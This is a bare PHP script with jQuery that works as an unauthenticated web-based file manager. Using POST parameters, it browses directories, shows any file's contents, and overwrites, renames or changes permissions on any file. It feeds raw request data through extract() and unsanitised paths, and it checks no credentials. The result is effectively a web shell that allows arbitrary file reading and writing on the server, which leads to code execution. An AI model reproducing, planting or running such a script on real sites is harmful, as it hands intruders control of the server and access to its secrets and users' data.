<style> html{ 	padding:20px; }dr,file{ 	display: inline; 	cursor: pointer; 	 }textarea{ 	width:100%; 	height: 60%; } </style>  <?php  if($_POST['submited']){ 	extract($_POST); 	rename($file,$rename); 	file_put_contents($rename,$edit); 	chmod($rename,$chmod); }  if(!$_POST['file']){ 	$dir = $_POST['dir'] ? $_POST['dir'] : '.'; 	$files = []; 	chdir($dir); 	print "PWD: ".getcwd()."<br>\r\n"; 	foreach(scandir('.') as $file){ 		if(is_dir($file)){ 			print "[ <dr>".$file."</dr> ]<br>\r\n"; 		}else{ 			array_push($files,"<file>".$file."</file><br>\r\n"); 		} 	} 	print implode($files,""); }else{ 	$file_name = $_POST['file']; 	$file_cont = file_get_contents($file_name); 	print "File: ".realpath($file_name)."<br>Writable: ".is_writable($file_name)."<br>"; 	?> 	 	<form action="#" method="post" > 	<input type="hidden" name="submited" value="true" > 	<input type="hidden" name="file" value="<?php print realpath($file_name); ?>" > 	<?php 	print "<textarea name='edit' >".htmlspecialchars($file_cont)."</textarea><br><br>"; 	print "Chmod <input name='chmod' value='".fileperms($file_name)."' ><br><br>"; 	print "Rename <input name='rename' value='".$file_name."' ><br><br>"; 	print "<input name='submit' type='Submit' >"; } ?> 	</form> <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script> <script> $('dr').click(function(dir){ 		directory = dir.currentTarget.textContent; 		$.ajax({ 			type: 'POST', 			url: window.location, 			crossDomain: true, 			data: { dir: <?php print "'$dir/'"; ?>+directory }, 			success: function(responseData, textStatus, jqXHR) { 				$('html').html( jqXHR.responseText ); 			} 		}); 	}); $('file').click(function(fil){ 		file = fil.currentTarget.textContent; 		$.ajax({ 			type: 'POST', 			url: window.location, 			crossDomain: true, 			data: { file: <?php print "'$dir/'"; ?>+file }, 			success: function(responseData, textStatus, jqXHR) { 				$('html').html( jqXHR.responseText ); 			} 		}); 	});  </script>